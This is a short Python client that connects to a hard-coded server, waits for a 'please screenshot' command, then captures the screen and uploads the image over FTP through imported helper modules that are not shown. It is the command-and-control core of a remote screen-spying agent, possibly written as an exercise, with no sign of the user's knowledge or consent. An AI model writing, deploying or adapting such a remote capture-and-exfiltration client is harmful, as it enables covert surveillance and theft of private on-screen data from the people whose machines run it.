import socket

from ftp_connection import upload_file
from take_screenshot import self_screenshot

SERVER_IP = '127.0.0.1'
SERVER_PORT = 12345


def is_screenshot_message(message: str) -> bool:
    return message == 'please screenshot'


def take_and_upload_screenshot():
    screenshot_filename = self_screenshot()
    upload_file(screenshot_filename)


def tcp_connect_and_handle_loop():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_socket.connect((SERVER_IP, SERVER_PORT))
        print(f"Connected to server {SERVER_IP}:{SERVER_PORT}")

        while True:
            print("Waiting for a message from the server...")
            message = client_socket.recv(1024).decode('utf-8')
            if is_screenshot_message(message):
                take_and_upload_screenshot()

    except ConnectionError as e:
        print(f"Connection error: {e}")

    finally:
        client_socket.close()
        print("Connection closed")
